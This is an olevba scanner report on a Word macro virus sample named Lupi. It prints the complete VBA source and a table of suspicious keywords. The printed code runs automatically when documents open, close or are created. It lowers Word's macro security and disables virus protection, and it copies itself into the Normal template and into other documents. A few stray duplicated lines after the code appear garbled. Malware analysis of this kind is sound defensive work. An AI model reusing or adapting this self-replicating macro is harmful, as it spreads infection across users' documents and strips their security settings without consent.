olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lupi-a248657a766aba05a6507e3df6a267fde3cfeb3a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lupi-a248657a766aba05a6507e3df6a267fde3cfeb3a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

'CISI-LUPI v1.02.002

Const virusIDRow = 3

Private Sub Cisi_Lupi()

'Destroy Virus with Virus...
'this is harmless virus
'code created by syarifl@bigfoot.com

'program kecil ini akan mengaktifkan Window VBA, agar
'anda langsung dapat melihat intruder yang masuk ke dalam VBA
'anda. Saya sudah coba dan terbukti sangat efektif untuk user
'dengan tingkat kemahiran menengah.

'On Error Resume Next

  Dim regs
  regs = "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
  If System.PrivateProfileString("", regs, "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", regs, "Level") = 1&
  Else
    'CommandBars("Tools").Controls("Macro").Enabled = False
    With Options
      .VirusProtection = False
      .ConfirmConversions = False
      .SaveNormalPrompt = False
    End With
  End If
  Dim adcp, adver
  Dim ntcp, ntver
  Set adcp = ActiveDocument.VBProject.VBComponents(1)
  Set ntcp = NormalTemplate.VBProject.VBComponents(1)
  adver = ProcessVersion(adcp.CodeModule.Lines(virusIDRow, 1))
  ntver = ProcessVersion(ntcp.CodeModule.Lines(virusIDRow, 1))
  Dim adln, ntln
  adln = adcp.CodeModule.CountOfLines
  ntln = adcp.CodeModule.CountOfLines
  Dim src
  Dim dst
  Dim ExitNow
  ExitNow = True
  If ntver > adver Then
    Set src = ntcp
    Set dst = adcp
    ExitNow = False
  ElseIf adver > ntver Then
    Set src = adcp
    Set dst = ntcp
    ExitNow = False
  End If
  If ExitNow Then Exit Sub
  Dim i
  For i = dst.CodeModule.CountOfLines To 1 Step -1
    dst.CodeModule.DeleteLines i, 1
  Next i
  For i = 1 To src.CodeModule.CountOfLines
    dst.CodeModule.InsertLines i, src.CodeModule.Lines(i, 1)
  Next i
  If (ntln <> 0) And (adln = 0) And (InStr(1, ActiveDocument.Name, "Document") = 0) Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
  ElseIf (InStr(1, ActiveDocument.Name, "Document") <> 0) Then
    ActiveDocument.Saved = True
  End If
End Sub

Private Function ProcessVersion(ver) As Long
On Error GoTo ProcessVersion_Err
  ver = Trim(ver)
  If ver = "" Then GoTo ProcessVersion_Err
  ver = Right(ver, 8)
  Dim x As Long
  x = Left(ver, 1) * 100000
  x = x + Mid(ver, 3, 2) * 1000
  x = x + Right(ver, 3)
  ProcessVersion = x
  Exit Function
ProcessVersion_Err:
  ProcessVersion = 0
End Function

Private Sub MyMsgBox(Prompt)
  Exit Sub
  VBA.MsgBox Prompt, vbOKOnly, "CISI-LUPI (" & Me.Name & ")"
End Sub

Private Sub Document_Open()
  MyMsgBox "Document_Open"
  VBE.MainWindow.Visible = True
  Call Cisi_Lupi
End Sub

Private Sub Document_Close()
  MyMsgBox "Document_Close"
  'VBE.MainWindow.SetFocus
  Call Cisi_Lupi
End Sub

Private Sub Document_New()
  MyMsgBox "Document_New"
  'VBE.MainWindow.SetFocus
  Call Cisi_Lupi
End Sub

Private Sub ViewVbCode()
  MyMsgBox "VBE Setfocus"
  VBE.MainWindow.SetFocus
End Sub

Private Sub Resetter()
On Error Resume Next
  Dim i%, j%
  For i = 1 To CommandBars.Count
    CommandBars(i).Reset
    For j = 1 To CommandBars(i).Controls.Count
      CommandBars(i).Controls(j).Reset
    Next j
  Next i
  CustomizationContext = NormalTemplate
  KeyBindings.ClearAll
End Sub

Private Sub cBars()
  Dim i%, j%
  For i = 1 To CommandBars.Count
    Selection.Font.Bold = True
    Selection.TypeText CommandBars(i).Name
    Selection.Font.Bold = False
    Selection.TypeParagraph
    For j = 1 To CommandBars(i).Controls.Count
      Selection.TypeText vbTab & CommandBars(i).Controls(j).Caption
      Selection.TypeParagraph
    Next j
  Next i
End Sub

Private Sub Tester()
  Dim x As Long
  x = ProcessVersion(virusID)
End Sub
     ActiveDocument.Saved = False) Then
     ActiveDocument.Saved = False) Then
     ActiveDocument.Saved = False) Then
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

